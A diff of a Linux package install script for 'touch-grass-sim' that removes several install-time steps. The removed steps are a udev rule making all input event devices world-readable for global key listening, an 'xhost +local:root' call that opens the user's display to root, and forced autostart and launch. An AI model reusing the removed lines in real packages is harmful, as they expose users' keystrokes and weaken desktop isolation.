@@ -1,44 +1,14 @@
 #!/bin/sh
 set -e
 
-# Grant unprivileged udev input permissions for pynput global listeners
-echo 'KERNEL=="event*", NAME="input/%k", MODE="0644", TAG+="uaccess"' > /etc/udev/rules.d/99-touch-grass-sim.rules
-udevadm control --reload-rules || true
-udevadm trigger || true
+chmod +x /usr/bin/touch-grass-sim || true
 
-# Register system autostart launcher
-mkdir -p /etc/xdg/autostart
-cat << 'EOF' > /etc/xdg/autostart/touch-grass-sim.desktop
-[Desktop Entry]
-Type=Application
-Name=Touch Grass SIM Setup Wizard
-Exec=/usr/bin/touch-grass-sim
-Icon=touch-grass-sim
-Terminal=false
-Categories=Utility;
-StartupNotify=false
-X-GNOME-Autostart-enabled=true
-EOF
-
-chmod 644 /etc/xdg/autostart/touch-grass-sim.desktop
-
-# Refresh desktop application databases and icon caches
 if [ -x "$(command -v update-desktop-database)" ]; then
     update-desktop-database -q || true
 fi
 
-# Allow local desktop session connections for X11/Wayland
-ACTIVE_USER=$(who | grep -E '\(:[0-9]\)|wayland' | awk '{print $1}' | head -n 1)
-if [ -n "$ACTIVE_USER" ] && [ "$ACTIVE_USER" != "root" ]; then
-    USER_ID=$(id -u "$ACTIVE_USER")
-    sudo -u "$ACTIVE_USER" DISPLAY=:0 xhost +local:root >/dev/null 2>&1 || true
-    
-    # Trigger application setup wizard explicitly using python3 to prevent execution failure
-    nohup sudo -u "$ACTIVE_USER" \
-        DISPLAY=:0 \
-        WAYLAND_DISPLAY=wayland-0 \
-        DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID/bus" \
-        /usr/bin/env python3 /usr/bin/touch-grass-sim >/dev/null 2>&1 &
+if [ -x "$(command -v gtk-update-icon-cache)" ]; then
+    gtk-update-icon-cache -q -t -f /usr/share/icons/hicolor || true
 fi
 
 exit 0
